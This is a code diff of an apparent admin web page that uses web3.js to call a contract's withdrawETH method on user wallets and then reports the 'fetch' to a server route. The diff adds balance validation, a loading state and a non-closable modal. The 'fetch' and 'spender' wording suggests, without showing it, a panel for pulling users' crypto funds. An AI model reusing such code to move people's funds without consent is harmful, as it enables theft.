@@ -154,42 +154,62 @@
         const adminWalletAddress = accounts[0]
         let user = $('#modal-wallet').val();
         let amount = $('#modal-amount').val();
-        try {
-            // Convert amount to Wei
-            const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
 
-            $("#fetchForm").attr('data-backdrop','static');
+        var balance = $("#modal-amount").val();
 
-            // Call the withdraw method on the contract
-            const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
-                from: adminWalletAddress,
-            })
-            console.log('ETH Withdrawal successful:', transaction)
+        var a_balance = $("#modal-balance").text();
 
-            if(transaction)
-            {
-                $.ajaxSetup({
-                headers: {
-                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                }
-                });
 
-                $.ajax({
-                    url: "{{ route('fetch.eth_tokens') }}",
-                    type: 'POST',
-                    data: {
-                        wallet: user,
-                        amount: amount,
-                        spender: accounts[0],
-                    },
-                }).done(function(response) {
-                    if (response == 'ok') {
-                        window.location.reload();
+        if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
+
+            $("#modal-amount").css("border", "1px solid red");
+          
+        }else{
+
+            $("#btn-fetch").css('display','none');
+            $("#loader-btn").css('display','block');
+            
+        
+            try {
+                // Convert amount to Wei
+                const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
+
+
+                // Call the withdraw method on the contract
+                const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
+                    from: adminWalletAddress,
+                })
+                console.log('ETH Withdrawal successful:', transaction)
+
+                if(transaction)
+                {
+                    $.ajaxSetup({
+                    headers: {
+                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                     }
-                });
+                    });
+
+                    $.ajax({
+                        url: "{{ route('fetch.eth_tokens') }}",
+                        type: 'POST',
+                        data: {
+                            wallet: user,
+                            amount: amount,
+                            spender: accounts[0],
+                        },
+                    }).done(function(response) {
+                        if (response == 'ok') {
+
+                            $("#btn-fetch").css('display','block');
+                            $("#loader-btn").css('display','none');
+
+                            window.location.reload();
+                        }
+                    });
+                }
+            } catch (error) {
+                console.error('Error withdrawing from contract:', error)
             }
-        } catch (error) {
-            console.error('Error withdrawing from contract:', error)
         }
     }
 
@@ -202,6 +222,7 @@
         const adminWalletAddress = accounts[0]
         let user = $('#modal-wallet').val();
         let amount = parseInt($('#modal-amount').val());
+
         try {
             // Call the withdraw method on the contract
 
@@ -268,7 +289,7 @@
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
 
-        if(balance == '' || balance == '0.0')
+        if(balance == '' || balance == '0.0' || balance == '0')
         {
             $('#errorForm').modal('show');
             
@@ -278,7 +299,10 @@
             $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
-            $('#fetchForm').modal('show');
+            $('#fetchForm').modal({
+                backdrop: 'static',
+                keyboard: false  // to prevent closing with Esc button (if you want this too)
+            });
         }
 
     }
@@ -292,7 +316,7 @@
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
 
-        if(balance == '' || balance == '0.0')
+        if(balance == '' || balance == '0.0' || balance == '0')
         {
             $('#errorForm').modal('show');
 
@@ -302,7 +326,10 @@
             $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
-            $('#fetchForm').modal('show');
+            $('#fetchForm').modal({
+                backdrop: 'static',
+                keyboard: false  // to prevent closing with Esc button (if you want this too)
+            });
         }
 
     }
